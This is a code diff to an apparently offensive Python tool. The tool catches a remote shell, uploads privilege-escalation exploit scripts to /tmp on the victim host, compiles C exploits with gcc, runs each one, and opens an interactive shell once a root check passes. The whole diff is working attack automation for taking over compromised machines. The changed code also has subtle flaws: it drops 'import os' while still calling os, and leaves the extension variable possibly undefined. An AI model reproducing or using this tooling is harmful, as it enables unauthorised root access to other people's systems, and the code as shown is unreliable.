@@ -7,7 +7,6 @@ import socket
 import struct
 import random
 import base64
-import os
 
 def main(port, interface):
     persistent = False
@@ -22,32 +21,42 @@ def main(port, interface):
         sock.listen(hosts)
         shell = Shell(sock, persistent)
         print('[+] Identifying privesc capabilities')
-        sh = test_privesc(sock, shell)
-        sh.interact()
+        privesc(sock, shell)
 
     except KeyboardInterrupt:
         sock.close()
 
-def test_privesc(sock, shell):
+def privesc(sock, shell):
     directory = './plugins/privesc/'
     counter = 1
     for filename in os.listdir(directory):
         f = os.path.join(directory, filename)
-        if os.path.isfile(f):
+        if os.path.isfile(f) and "sudo" not in f:
             print('[+] Uploading privesc script number {}'.format(counter))
             rsh = RSH(sock)
-            rsh.upload('{0}'.format(f), '/tmp/exploit{0}.sh'.format(counter))
-            sock.send('chmod +x /tmp/exploit{0}.sh\n'.format(counter))
+            if '.sh' in f:
+                ext = '.sh'
+            elif '.c' in f:
+                ext = '.c'
+            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
             sock.send('cd /tmp\n')
-            sock.send('./exploit{}.sh\n'.format(counter))
+            if ext == '.c':
+                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
+                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
+                sock.send('./exploit{0}\n'.format(counter, ext))
+            elif ext == '.sh':
+                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
+                sock.send('./exploit{0}{1}\n'.format(counter, ext))
             sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
             rsh.file_exists('/tmp/valid_root')
             if rsh.file_exists('/tmp/valid_root') == True:
                 sock.send('rm /tmp/valid_root\n')
-                sock.send('rm /tmp/exploit{}.sh\n'.format(counter))
-                return shell
-            shell.interact()
-            sock.close()
+                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
+                shell.interact()
+                sock.close()
+            else:
+                print("")
+                sock.send('rm /tmp/exploit*\n') 
             counter += 1
 
 
@@ -415,7 +424,7 @@ class RSH:
             
             file = open(localfile, 'rb')
             while True:
-                chunk = file.read(1024)
+                chunk = file.read(16384)
                 if not chunk: 
                     break
                 chunk = base64.b64encode(chunk)
